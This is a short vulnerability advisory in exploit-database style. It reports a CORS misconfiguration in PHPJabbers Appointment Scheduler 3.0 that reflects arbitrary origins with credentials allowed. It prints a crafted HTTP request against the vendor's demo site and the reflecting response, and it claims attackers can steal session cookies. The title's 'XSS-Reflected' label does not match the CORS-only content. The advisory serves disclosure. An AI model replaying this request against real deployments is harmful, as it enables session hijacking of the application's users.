## Title: Appointment Scheduler-3.0 XSS-Reflected CORS Vulnerability
## Author: nu11secur1ty
## Date: 09/01/2023
## Vendor: https://www.phpjabbers.com/
## Software: https://www.phpjabbers.com/appointment-scheduler/#sectionDemo
## Reference: https://portswigger.net/web-security/cors

## Description:
The application implements an HTML5 cross-origin resource sharing (CORS) policy for this request that allows access from any domain.
The application allowed access from the requested origin http://dmutjzrkaazq.com
Since the Vary: Origin header was not present in the response, reverse proxies and intermediate servers may cache it. This may enable an attacker to carry out cache poisoning attacks. The attacker can steal the cookie session by using a third-party exploit server and javascript exploit etc.

STATUS: HIGH Vulnerability

[+]Exploit:
```
GET /1693549104_677/index.php?controller=pjFrontPublic&action=pjActionServices&cid=1&locale=1&hide=0&layout=2&date=2023-09-01&theme=theme1&session_id= HTTP/1.1
Host: demo.phpjabbers.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Connection: close
Cache-Control: max-age=0
Origin: http://192.168.100.45/PoC.html
Referer: http://demo.phpjabbers.com/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0

```

[+]Response:
```HTTP
HTTP/1.1 200 OK
Date: Fri, 01 Sep 2023 07:52:46 GMT
Server: Apache/2.2.15 (CentOS)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Access-Control-Allow-Origin: http://192.168.100.45/PoC.html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Origin, X-Requested-With
P3P: CP="ALL DSP COR CUR ADM TAI OUR IND COM NAV INT"
Vary: Accept-Encoding
Set-Cookie: AppointmentScheduler=6rmicu3ncgo4tvsnmqtq5cbbv3; SameSite=None; Secure;Secure;SameSite=None
Content-Length: 18767
Connection: close
Content-Type: text/html; charset=utf-8
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/phpjabbers/2023/Appointment-Scheduler-3.0)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/09/appointment-scheduler-30-xss-reflected.html)

## Time spent:
00:35:00


-- 
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>
